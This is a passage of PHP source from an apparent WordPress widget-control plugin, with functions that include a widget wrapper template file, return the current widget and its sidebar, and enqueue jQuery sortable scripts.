	$hasWrapper = (isset($widget['p']['twcp_wrapper_file']) && $widget['p']['twcp_wrapper_file']);
	$wrapper = $widget['p']['twcp_wrapper_file'];
	
	//reasons to return
	if (!$hasWrapper || !$wrapper || !is_file($wrapper) || !file_exists($wrapper)) 
		return $display;
	
	//initializing variables
	$twc_widget_to_wrap = $display;
	$twc_widget = $widget;
	
	ob_start();
	require $wrapper;
	return ob_get_clean();
}

/**
 * function is responsible for returning the widget class
 * 
 */
function twc_widget_object()
{
	//initializing variables
	global $twc_widget;
	return $twc_widget;
}

/**
 * function is responsible for returning the complete sidebar info
 *
 */
function twc_get_widget_sidebar()
{
	//initializing variables
	global $wp_registered_sidebars;
	$widget = twc_widget_object();
	$sidebar_id = twc_get_widgets_sidebar($widget['id']);
	
	return $wp_registered_sidebars[$sidebar_id];
}

/**
 * function is responsible for including the required files for sortables
 *
 */
function twc_sortable_initialize()
{
	//reasons to fail
	if (!TWC_IS_SORTER) return false;
	
	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'jquery-ui-sortable' );
	wp_enqueue_script( 'twc-sortables' );
	
	wp_enqueue_style( 'twc-sortables' );
	
}





